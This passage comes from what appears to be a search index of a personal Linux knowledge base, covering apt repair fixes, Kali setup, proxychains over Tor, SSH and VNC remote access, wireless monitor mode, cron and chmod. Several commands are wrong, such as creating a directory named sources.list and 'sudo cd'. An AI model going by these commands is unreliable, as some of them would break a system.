full-upgrade\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_Ubuntu_update_error_waiting_for_unattended-upgrade_to_exit/#turn-the-automatic-updater-back-on-now-that-the-blockage-is-cleared","title":"Turn the automatic updater back on, now that the blockage is cleared:","text":"<pre><code>sudo dpkg-reconfigure -plow unattended-upgrades\n</code></pre> <p>Select the package unattended-upgrades again.</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_sources_repos_list_DNS_Linux/","title":"FIX Linux sources repos list DNS Linux","text":"<p>Broken links</p> <p>/usr/lib/apt/methods/https could not be found</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_sources_repos_list_DNS_Linux/#locating-the-brokentrouble-link-when-running-apt-update","title":"Locating the broken/trouble link when running apt update","text":"<pre><code>cd /etc/apt/\n#Replace BROKEN_LINK\nsudo grep -ir \"BROKEN_LINK\" .\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_sources_repos_list_DNS_Linux/#e-the-method-driver-usrlibaptmethodshttps-could-not-be-found-n-is-the-package-apt-transport-https-installed","title":"E: The method driver /usr/lib/apt/methods/https could not be found. N: Is the package apt-transport-https installed?","text":"<pre><code>cd /usr/lib/apt/methods\nsudo ln -s http https\nsudo apt install apt-transport-https\nsudo mv /var/lib/apt/lists /var/lib/apt/lists_backup\nsudo mkdir /var/lib/apt/lists\nsudo apt-get update\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_sources_repos_list_DNS_Linux/#e-the-method-driver-usrlibaptmethodshttps-could-not-be-found-error-sounds-like-you-may-have-added-some-https-sources-since-there-are-no-https-sources-in-your-sourceslist-it-would-be-something-in-etcaptsourceslistd","title":"E: The method driver /usr/lib/apt/methods/https could not be found.\u201d error? Sounds like you may have added some https sources. Since there are no https sources in your sources.list, it would be something in /etc/apt/sources.list.d/.","text":"<pre><code>sudo apt install apt-transport-https ca-certificates\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_sources_repos_list_DNS_Linux/#gpg-error-httpspackagecloudioooklaspeedtest-cliubuntu-xenial-inrelease-the-following-signatures-couldnt-be-verified-because-the-public-key-is-not-available-no_pubkey-8e61c2ab9a6d1557","title":"GPG error: https://packagecloud.io/ookla/speedtest-cli/ubuntu xenial InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 8E61C2AB9A6D1557","text":"<pre><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 8E61C2AB9A6D1557\napt-key list\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_sources_repos_list_DNS_Linux/#update-errors","title":"Update errors","text":"<pre><code>sudo rm -r /var/cache/apt/archives/apt-fast\nsudo apt clean\nsudo apt auto-clean\n\nsudo mv /var/lib/apt/lists /var/lib/apt/lists_backup\nsudo mkdir /var/lib/apt/lists\nsudo apt-get update\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_sources_repos_list_DNS_Linux/#failed-to-fetch-https-e-the-repository-https-n-updating-from-such-a-repository-cant-be-done-securely-and-is-therefore-disabled-by-default-n-see-apt-secure8-manpage-for-repository-creation-and-user-configuration-details","title":"Failed to fetch https:// E: The repository 'https N: Updating from such a repository can't be done securely, and is therefore disabled by default. N: See apt-secure(8) manpage for repository creation and user configuration details.","text":"<p>Locate the file in following path and remove the .list file</p> <pre><code>sudo mv  /etc/apt/sources.list /etc/apt/sources.list.bak\nsudo mv  /etc/apt/sources.list.d /etc/apt/sources.list.d.bak\nsudo mkdir /etc/apt/sources.list\nsudo mkdir /etc/apt/sources.list.d\n\n/etc/apt/sources.list.d\nrm XXXX.list\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_sources_repos_list_DNS_Linux/#list-update-errors","title":"List update errors","text":"<pre><code>cd /etc/apt/sources.list.d\nls -l\n\nsudo touch sources.list\nsudo nano sources.list\n\n#ADD THE BELOW AND SAVE\ndeb &lt;http://security.debian.org/debian-security&gt; jessie/updates main    \ndeb &lt;http://ftp.debian.org/debian/&gt; jessie-updates contrib main   \ndeb-src &lt;http://security.debian.org/&gt; jessie/updates contrib main  \ndeb-src &lt;http://ftp.debian.org/debian/&gt; jessie-updates contrib main \n\nsudo apt-get install apt-transport-https\nsudo apt-get update\nsudo apt-get upgrade\n\ncd /var/lib/apt/lists/\n\ncd /etc/apt/sources.list.d\nsudo nano sources.list\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_speedtest-cli_apt_update_error/","title":"FIX Linux speedtest-cli apt update error","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Fixes/FIX_Linux_speedtest-cli_apt_update_error/#w-gpg-error-httpspackagecloudioooklaspeedtest-cliubuntu-focal-inrelease-the-following-signatures-couldnt-be-verified-because-the-public-key-is-not-available-no_pubkey-8e61c2ab9a6d1557-e-the-repository-httpspackagecloudioooklaspeedtest-cliubuntu-focal-inrelease-is-not-signed","title":"W: GPG error: https://packagecloud.io/ookla/speedtest-cli/ubuntu focal InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 8E61C2AB9A6D1557 E: The repository 'https://packagecloud.io/ookla/speedtest-cli/ubuntu focal InRelease' is not signed.","text":"<pre><code>cd /etc/apt/sources.list.d\nsudo rm ookla_speedtest-cli.list\nsudo rm ookla_speedtest-cli.list.save\nsudo apt update &amp;&amp; upgrade -y\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/Issues_fixes/","title":"Issues fixes","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/Issues_fixes/#kali-login-screen-loop","title":"Kali - Login screen loop","text":"<p>On login screen [CTRL+ALT+F1] to open shell Login with your creds</p> <pre><code>sudo apt update &amp;&amp; sudo apt upgrade -y\n</code></pre> <p>Find which desktop environment you were using</p> <pre><code>gdm3 -version or lightdm -v\nsudo apt-get clean\n</code></pre> <p>Use the opposite one, the non-used environmet for install</p> <pre><code>sudo apt-get install gdm3\n</code></pre> <p>Proceed through setup windows</p> <pre><code>dpkg-reconfigure gdm3\nsudo gdm3\n</code></pre> <p>login now</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/Proxychains/","title":"Proxychains","text":"<p>Proxychains</p> <pre><code>sudo systemctl enable tor\nsudo service tor start\nsudo proxychains firefox\n</code></pre> <p>You can locate low latency proxies at https://spys.one/en/socks-proxy-list/</p> <pre><code>sudo nano /etc/proxychains4.conf\n</code></pre> <p>Also you can increase the number of chains Add proxies to end in this format socksx x.x.x.x yyyy</p> <pre><code>round_robin_chain\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/SSH_Server/","title":"SSH Server","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/SSH_Server/#installing-ssh-server-and-enabling-the-service-permanently","title":"Installing SSH Server and Enabling the service permanently","text":"<pre><code>sudo apt-get install ssh\nsudo service ssh start\nsystemctl enable ssh.service\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/SSH_Server/#enable-kali-linux-remote-ssh-service","title":"Enable Kali Linux Remote SSH Service","text":"<pre><code>sudo update-rc.d -f ssh remove\nsudo update-rc.d -f ssh defaults\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/SSH_Server/#change-kali-default-ssh-keys-to-avoid-mitm-attack","title":"Change Kali Default SSH Keys to Avoid MITM Attack","text":"<pre><code>sudo cd /etc/ssh/\nsudo mkdir default_kali_keys\nsudo mv ssh_host_* default_kali_keys/\nsudo dpkg-reconfigure openssh-server\nmd5sum ssh_host_*\ncd default_kali_keys/\nsudo service ssh restart\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/SSH_Server/#if-you-start-getting-warning-signs-when-logging-in","title":"If you start getting warning signs when logging in","text":"<pre><code>nano /root/.ssh/known_hosts\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/SSH_Server/#change-ssh-port","title":"Change ssh port","text":"<pre><code>sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config_backup\nsudo nano /etc/ssh/sshd_config\nsudo service ssh restart\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/SSH_Server/#check-ssh-status","title":"Check SSH Status","text":"<pre><code>systemctl status ssh.service\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/VNC_over_SSH/","title":"VNC over SSH","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/VNC_over_SSH/#install-x11vnc","title":"install x11vnc","text":"<pre><code>sudo apt update &amp;&amp; sudo apt upgrade -y\napt install x11vnc\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/VNC_over_SSH/#change-user-with-actual-user","title":"change user with actual user","text":"<p><pre><code>x11vnc storepasswd /home/user/.vnc/passwd\n</code></pre> Enter password</p> <pre><code>mkdir /home/user/.config/autostart\nsudo nano /home/user/.config/autostart/x11vnc.desktop\n</code></pre> <pre><code>[Desktop Entry]\nName=X11VNC Server\nComment=Share this desktop by VNC\nIcon=computer\nType=Application\nNoDisplay=false\nHidden=false\nX-GNOME-Autostart-Delay=0\nExec=x11vnc -ncache 10 -nap -forever -loop -repeat -rfbauth /home/user/.vnc/passwd -rfbport 5900 -noncache display :0 -noxdamage\n</code></pre> <pre><code>cd /etc/init.d\nsudo nano x11vncscript.sh\nsudo chmod +x x11vncscript.sh\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/VNC_over_SSH/#write-your-scrip-and-save","title":"Write your scrip and save","text":"<pre><code>sudo x11vnc -ncache 10 -nap -forever -loop -repeat -rfbauth /home/user/.vnc/passwd -rfbport 5900 -noncache display :0 -noxdamage\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/VNC_over_SSH/#now-everytime-the-os-boots-it-will-run-all-scripts-in-the-initd","title":"Now everytime the OS boots it will run all scripts in the init.d","text":"<p>To test you can do the following</p> <pre><code>cd /etc/init.d\nsudo ./x11vncscript.sh\n</code></pre> <pre><code>ss -antp | grep vnc\n/usr/share/novnc/utils/novnc_proxy --listen 8081 --vnc localhost:5900\n</code></pre> <p>You can access it now through your browser at http://10.10.10.102:8081/vnc.html?host=hostname&amp;port=8081</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/Wireless_Adapter/","title":"Wireless Adapter","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/Wireless_Adapter/#installing-rtl88xxau","title":"installing rtl88xxau","text":"<pre><code>lsusb -v\ndmesg | grep usbcore\n\nsudo apt install realtek-rtl88xxau-dkms\nsudo reboot\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/Wireless_Adapter/#enabling-monitor-mode","title":"enabling monitor mode","text":"<p>assuming the adapter is named wlan0</p> <pre><code>ifconfig wlan0 down\nairmon-ng check kill\niwconfig wlan0 mode monitor\nifconfig wlan0 up\n</code></pre> <p>example output</p> <pre><code>Chipset: Realtek RTL8812AU.\nStandards: IEEE 802.11 a/b/g/n/ac.\nData Rate:\n\n802.11b: UP to 11Mbps.\n\n802.11g: UP to 54Mbps.\n\n802.11a: UP to 54Mbps.\n\n802.11n: UP to 150Mbps.\n\n802.11ac: UP to 867Mbps.\nSupported OS: Kali Linux (whether it is installed as a virtual machine or a main OS).\nInterface: USB 3.0.\nAntenna Type: 1 x 2.4Ghz RP-SMA connector.\nAntenna: 2x 5dBi Antennas.\nFrequency Range: 2.4 &amp; 5 GHz.\nSecurity: WEP 64/128, 802.1X support, Wi-Fi Protected Access (WPA), WPA-PSK, WPA II-PSK.\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/kali_setup/","title":"kali setup","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Kali/kali_setup/#install-all-packages","title":"install all packages","text":"<pre><code>sudo apt install kali-linux-everything\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Hierarchy/","title":"Hierarchy","text":"Directory or file Description / The slash / character alone denotes the root of the filesystem tree. /bin Stands for binaries and contains certain fundamental utilities, such as ls or cp, that are needed to mount /usr, when that is a separate filesystem, or to run in one-user (administrative) mode when /usr cannot be mounted. In System V.4, this is a symlink to /usr/bin. Otherwise, it needs to be on the root filesystem itself. /boot Contains all the files needed for successful booting process. In Research Unix, this was one file rather than a directory.[14] Nowadays usually on the root filesystem itself, unless the system, bootloader etc. require otherwise. /dev Stands for devices. Contains file representations of peripheral devices and pseudo-devices. See also: Linux Assigned Names and Numbers Authority. Needs to be on the root filesystem itself. /etc Contains system-wide configuration files and system databases; the name stands for et cetera[14] but now a better expansion is editable-text-configurations. Originally also contained \"dangerous maintenance utilities\" such as init,[6] but these have typically been moved to /sbin or elsewhere. Needs to be on the root filesystem itself. /home Contains user home directories on Linux and some other systems. In the original version of Unix, home directories were in /usr instead.[15] Some systems use or have used different locations still: macOS has home directories in /Users, older versions of BSD put them in /u, FreeBSD has /usr/home. /lib Originally essential libraries: C libraries, but not Fortran ones.[14] On modern systems, it contains the shared libraries needed by programs in /bin, and possibly loadable kernel module or device drivers. Linux distributions may have variants /lib32 and /lib64 for multi-architecture support. /media Default mount point for removable devices, such as USB sticks, media players, etc. By common sense, the directory itself, whose subdirectories are mountpoints, is on the root partition itself. /mnt Stands for mount. Empty directory commonly used by system administrators as a temporary mount point. By common sense, the directory itself, whose subdirectories are mountpoints, is on the root partition itself. /opt Contains locally installed software. Originated in System V, which has a package manager that installs software to this directory (one subdirectory per package).[16] /proc procfs virtual filesystem showing information about processes as files. /root The home directory for the superuser root - that is, the system administrator. This account's home directory is usually on the initial filesystem, and hence not in /home (which may be a mount point for another filesystem) in case specific maintenance needs to be performed, during which other filesystems are not available. Such a case could occur, for example, if a hard disk drive suffers failures and cannot be properly mounted. By convention, this directory is on the root partition itself; in any case, it is not a link to /home/root or any such thing. /sbin Stands for \"system (or superuser) binaries\" and contains fundamental utilities, such as init, usually needed to start, maintain and recover the system. Needs to be on the root partition itself. /srv Server data (data for services provided by system). /sys In some Linux distributions, contains a sysfs virtual filesystem, containing information related to hardware and the operating system. On BSD systems, commonly a symlink to the kernel sources in /usr/src/sys. /tmp A place for temporary files not expected to survive a reboot. Many systems clear this directory upon startup or use tmpfs to implement it. /unix The Unix kernel in Research Unix and System V.[14] With the addition of virtual memory support to 3BSD, this got renamed /vmunix. /usr The \"user file system\": originally the directory holding user home directories,[15] but already by the Third Edition of Research Unix, ca. 1973, reused to split the operating system's programs over two disks (one of them a 256K fixed-head drive) so that basic commands would either appear in /bin or /usr/bin.[17] It now holds executables, libraries, and shared resources that are not system critical, such as the X Window System, window managers, scripting languages, etc. In older Unix systems, user home directories might still appear in /usr alongside directories containing programs, although by 1984 this depended on local customs.[14] /include Stores the development headers used throughout the system. Header files are mostly used by the #include directive in C language, which historically is how the name of this directory was chosen. /lib Stores the needed libraries and data files for programs stored within /usr or elsewhere. /libexec Holds programs meant to be executed by other programs rather than by users directly. E.g., the Sendmail executable may be found in this directory.[18] Not present in the FHS until 2011;[19] Linux distributions have traditionally moved the contents of this directory into /usr/lib, where they also resided in 4.3BSD. /local Resembles /usr in structure, but its subdirectories are used for additions not part of the operating system distribution, such as custom programs or files from a BSD Ports collection. Usually has subdirectories such as /usr/local/lib or /usr/local/bin. /share Architecture-independent program data. On Linux and modern BSD derivatives, this directory has subdirectories such as man for manpages, that used to appear directly under /usr in older versions. /var Stands for variable. A place for files that might change frequently - especially in size, for example e-mail sent to users on the system, or process-ID lock files. /log Contains system log files. /mail The place where all incoming mail is stored. Users (other than root) can access their own mail only. Often, this directory is a symbolic link to /var/spool/mail. /spool Spool directory. Contains print jobs, mail spools and other queued tasks. /src The place where the uncompiled source code of some programs is. /tmp The /var/tmp directory is a place for temporary files which should be preserved between system reboots."},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/","title":"Tree-Directory Browsing","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#installing-tree","title":"Installing tree","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#for-debian-distros","title":"For Debian distros","text":"<pre><code>sudo apt install tree\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#for-arch-based-distros","title":"For Arch-based distros","text":"<pre><code>sudo pacman -S tree\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#treeing-a-directory","title":"treeing a directory","text":"<pre><code>tree target_directory\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#tree-commands","title":"Tree Commands","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#list-only-directories","title":"List only directories","text":"<p>Use the <code>-d</code> option to list only the directories, at a specified location</p> <pre><code>tree -d target_directory\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#list-hidden-files","title":"List hidden files","text":"<p>use the <code>-a</code> option to show hidden files</p> <pre><code>tree -a target_directory\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#include-the-path-of-files","title":"Include the path of files","text":"<p>Use the <code>-f</code> option to get the path for each file</p> <pre><code>tree -f directory.\n</code></pre> <p>But what about getting the full path? Well, you just have to append the full path of a directory (from home to the target one)</p> <pre><code>tree -f /home/sagar/Directory\n</code></pre> <p>Or you can use cd into the directory and then run the following</p> <pre><code>tree -f \"$(pwd)\"\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#list-files-and-directories-based-on-the-level","title":"List files and directories based on the level","text":"<p>If the directory has hundreds of subdirectories and if you only want to list the first certain levels such as want to include the first one or two subdirectories.</p> <p>Use the <code>-L</code> option to specify the levels</p> <pre><code>tree -L Level\n</code></pre> <p>example, listing files that are at level 2</p> <pre><code>tree -L 2\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#list-files-with-permission","title":"List files with permission","text":"<p>Use the <code>-p</code> option to list file permissions</p> <pre><code>tree -p TargetDirectory\n</code></pre> <p>for better readability use it with <code>-h</code> option, example</p> <pre><code>tree -ph MUSIC\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#get-the-file-size-of-a-directory-using-the-tree-command","title":"Get the file size of a directory using the tree command","text":"<p>The tree command can show you the size of each file and directory, at a specified location and will also sum the size for you n the end.</p> <pre><code>tree -df -h TargetDirectory\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#list-files-based-on-the-last-modification-using-the-tree-command","title":"List files based on the last modification using the tree command","text":"<p>There are two ways of sorting files based on modification:</p> <ul> <li>First modified       </li> <li>Last modified</li> </ul>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#sort-files-based-on-first-modification","title":"Sort files based on first modification","text":"<p>Use the <code>-c</code> option to sort files based on file modification, were modified the first by default Use the <code>-D</code> option to get the date and time of modification</p> <pre><code>tree -cD TargetDirectory\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Linux_Directories/Tree-Directory_Browsing/#sort-files-based-on-the-last-modification","title":"Sort files based on the last modification","text":"<p>Use the <code>-c</code> option to list files based on the first modification Use the <code>-r</code> option which will reverse the effect of <code>-c</code> option</p> <pre><code>tree -cDr TargetDirectory\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/Crontab_cronjob/","title":"Crontab cronjob","text":"<p>The crontab file has a specific syntax for defining the schedule of a task. Each line in the file represents a single task, and the line is made up of six fields separated by spaces, representing the schedule for when the task should run. The fields are as follows:</p> <p></p> <p>For example, to run a task every day at 3:00 AM, the line in the crontab file would be:</p> <pre><code>0 3 * * * &lt;command&gt;\n</code></pre> <p>To schedule a task to run every day at 3:00 PM, the line in the crontab file would be:</p> <pre><code>0 15 * * * &lt;command&gt;\n</code></pre> <p>You can also use the special characters , /n, a-b, , to configure the schedule.</p> <pre><code>/5 * * * * &lt;command&gt; # run every 5 minutes\n0 3,6,9 * * * &lt;command&gt; # run at 3:00 AM, 6:00 AM, 9:00 AM\n</code></pre> <p>To create or edit your crontab</p> <pre><code>crontab -e\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/Crontab_cronjob/#list-current-crontab","title":"list current crontab","text":"<pre><code>crontab -l\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/Crontab_cronjob/#remove-current-crontab","title":"remove current crontab","text":"<pre><code>crontab -r\n</code></pre> <p>crontab can run only shell commands, not scripts!</p> <pre><code>sudo apt-get update\nsudo apt-get install cron\ncrontab -l\n\n#**If you see the output of** \"*/30 * * * * python /var/www/py/testingpython.py\"\n#**Then no need to adjust**\n\n#**Otherwise**\nsudo nano crontab -e\n1\n\n#hit page down a few times then paste and save changes\n*/30 * * * * python3 /var/www/py/testingpython.py\n\n#IF CRONTAB NO WORKY, DO THIS\ncat /etc/cron.d/speedtest_cron\n\n#/**************** TEST! *********************/\ncd /var/www/py/\npython3 testingpython.py\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/Crontab_cronjob/#basic-cron-syntax","title":"Basic Cron Syntax","text":"<p>There's a useful site called Crontab Generator that will calculate the setup of a cron job for you, but first we'll go through a brief overview of what a syntax will look like.</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/Crontab_cronjob/#example-cron-job","title":"Example cron job","text":"<pre><code>* * * * /usr/bin/php /var/www/html/crontest/cron.php &gt; /dev/null 2&gt;&amp;1\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/Crontab_cronjob/#parts-of-a-cron-command","title":"Parts of a cron command","text":"<p>cron command parts: - timing - the command to execute</p> <p>In this example, the command includes three parts:</p> Timing Execute Path to script Output * * * * * /usr/bin/php /var/www/html/crontest/cron.php &gt; /dev/null 2&gt;&amp;1 <ul> <li>Timing - set the minutes, hours, days, months, and weekday settings (more below).</li> <li>Execute - the cron job needs to call upon PHP to run, which is located at /usr/bin/php.</li> <li>Path to script - the full path of the file you plan to run.</li> <li>Output - (optional) you can write the output to a file or discard it - &gt; /dev/null 2&gt;&amp;1 will discard.</li> </ul> <p>In the above example, the cron job is set to send every minute - or more specifically, every minute of every hour of every day of every month, every day of the week. An asterisk is a wildcard that stands for \"all\".</p> <ul> <li>Minutes - set the minutes, from 0-59</li> <li>Hours - set the hour, from 0-24</li> <li>Days - set the day, from 1-31</li> <li>Months - set the month, from 1-12 (January - December)</li> <li>Week - set the day of the week, from 0-6 (Sunday - Saturday)</li> </ul> <p>Here are a few basic examples to get an idea of how it works.</p> Syntax Explanation 0 * * * * run once an hour (every hour at minute zero) 0 0 * * * run once a day (every day at midnight and minute zero) 0 0 1 * * run once a month (on the first day of every month at midnight and minute zero) 0 0 1 1 * run once a year (on the first day of the first month every year at midnight and minute zero) <p>There are all sorts of settings, such as for odd/even days, every 5 minutes, etc.</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/Crontab_cronjob/#setting-up-a-cron-job","title":"Setting Up a Cron Job","text":"<p>If cron is set up under root, you'll need to run sudo before your code.</p> <p>example of a cron job sending out an email once a day</p> <pre><code>0 0 * * * /usr/bin/php /var/www/html/crontest/cron.php &gt;/dev/null 2&gt;&amp;1\n</code></pre> <p>list all crontabs</p> <pre><code>crontab -l\n#crontab: no crontab for user\n</code></pre> <p>edit the crontab</p> <pre><code>crontab -e\n</code></pre> <p>save your changes and exit the file.</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/File_Permissions/","title":"File Permissions","text":"<p>The chmod command is used to change the permissions of a file or directory in Linux. The permissions can be represented by a combination of letters (rwx) or by octal numbers (0-7). The octal numbers represent the permissions for the owner, group, and other users, and each number is a combination of the binary values for read, write, and execute permissions.</p> <p>The octal numbers for chmod are</p> <p><pre><code>7 =rwx (read, write, execute)\n6 =rw- (read, write)\n5 =r-x (read, execute)\n4 =r-- (read only)\n3 =-wx (write, execute)\n2 =-w- (write only)\n1 =--x (execute only)\n0 =--- (no permission)\n</code></pre> |value|description| |:-|:-| |'0'| (000) <code>---</code> No permission| |'1'| (001) <code>--x</code> Execute permission| |'2'| (010) <code>-w-</code> Write permission| |'3'| (011) <code>-wx</code> Write and execute permissions| |'4'| (100) <code>r--</code> Read permission| |'5'| (101) <code>r-x</code> Read and execute permissions| |'6'| (110) <code>rw-</code> Read and write permissions| |'7'| (111) <code>rwx</code> Read, write, and execute permissions|</p> <p>For example, to give read, write, and execute permissions to the owner, read and execute permissions to the group, and execute permission to others</p> <p>chmod <code>751</code> file.txt You can also use the binary representation of each digit to understand the permission better. For example,</p> <p>example</p> <pre><code>chmod 751 file.txt\n</code></pre> <p>111 (<code>7</code>) is binary representation of 7, first digit represents user permission, so it is 111 (<code>rwx</code>) 101 (<code>5</code>) is binary representation of 5, second digit represents group permission, so it is 101 (<code>r-x</code>) 001 (<code>1</code>) is binary representation of 1, third digit represents other permission, so it is 001 (<code>--x</code>)</p> <p>There's a mnemonic that can help you remember these numbers</p> <pre><code>rwx rw- r-x r-- -wx -w- --x ---\n\nchmod 7 =rwx\nchmod 6 =rw-\nchmod 5 =r-x\nchmod 4 =r--\nchmod 3 =-wx\nchmod 2 =-w-\nchmod 1 =--x\nchmod 0 =---\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/Linux_Kernal/","title":"Linux Kernal","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/OS_Upgrade/","title":"OS Upgrade","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/OS_Upgrade/#recommended","title":"Recommended","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/OS_Upgrade/#check-os-release","title":"Check OS release","text":"<pre><code>lsb_release -a\ncat /etc/lsb-release\ncat /etc/os-release\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/OS_Upgrade/#check-packages-with-available-upgrades","title":"check packages with available upgrades","text":"<pre><code>sudo apt update\nsudo apt list --upgradable\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/OS_Upgrade/#upgrade-steps","title":"upgrade steps","text":"<pre><code>sudo apt clean\nsudo apt autoclean\nsudo apt update\nsudo apt upgrade -y\nsudo apt dist-upgrade\nsudo do-release-upgrade\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/OS_Upgrade/#upgrade-using-apt-fast-not-tested","title":"Upgrade using apt-fast - NOT TESTED","text":"<p>Update your software sources </p> <pre><code>do-release-upgrade\n</code></pre> <p>To point to the newer version of ubuntu. After it runs an update, and  asks you to press enter to start the process of upgrade.</p> <p>Open a new terminal, and start the upgrade, delete the lock file for apt first.</p> <pre><code>sudo rm /var/lib/apt/lists/lock\napt-fast dist-upgrade\n</code></pre> <p>Remember that this has to be entered on a new terminal, because, if you cancel the upgrade at that step, the upgrade rolls back the changes to the repositories.</p> <p>After apt-fast finishes, you can shift to the original terminal and continue the upgrade</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/Users_and_Groups/","title":"Users and Groups","text":"<p>The chmod command is used to change the permissions of a file or directory in Linux. The permissions can be represented by a combination of letters (rwx) or by octal numbers (0-7). The octal numbers represent the permissions for the owner, group, and other users, and each number is a combination of the binary values for read, write, and execute permissions.</p> <p>The octal numbers for chmod are:</p> <p><code>7</code> = <code>rwx</code> (read, write, execute) <code>6</code> = <code>rw-</code> (read, write) <code>5</code> = <code>r-x</code> (read, execute) <code>4</code> = <code>r--</code> (read only) <code>3</code> = <code>-wx</code> (write, execute) <code>2</code> = <code>-w-</code> (write only) <code>1</code> = <code>--x</code> (execute only) <code>0</code> = <code>---</code> (no permission) For example, to give read, write, and execute permissions to the owner, read and execute permissions to the group, and execute permission to others, you would use the command:</p> <p>Copy code chmod <code>751</code> file.txt You can also use the binary representation of each digit to understand the permission better. For example,</p> <p>Copy code chmod <code>751</code> file.txt means:</p> <p>111 (<code>7</code>) is binary representation of <code>7</code>, first digit represents user permission, so it is 111 (rwx) 101 (<code>5</code>) is binary representation of <code>5</code>, second digit represents group permission, so it is 101 (r-x) 001 (1) is binary representation of 1, third digit represents other permission, so it is 001 (<code>--x</code>) There's a mnemonic that can help you remember these numbers:</p> <p><code>rwx rw- r-x r-- -wx -w- --x ---</code></p> <pre><code>chmod 7 =rwx\nchmod 6 =rw-\nchmod 5 =r-x\nchmod 4 =r--\nchmod 3 =-wx\nchmod 2 =-w-\nchmod 1 =--x\nchmod 0 =---\n</code></pre>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/vsftpd_very_secure_FTP_daemon/","title":"vsftpd very secure FTP daemon","text":"<p>vsftpd appspot</p>"},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/vsftpd_very_secure_FTP_daemon/#vsftpd-very-secure-ftp-daemon","title":"vsftpd (very secure FTP daemon)","text":""},{"location":"Knowledge_Base/OS/Linux/Debian/Misc/vsftpd_very_secure_FTP_daemon/#installing-vsftpd","title":"Installing vsftpd","text":"<pre><code>sudo apt-get install -y 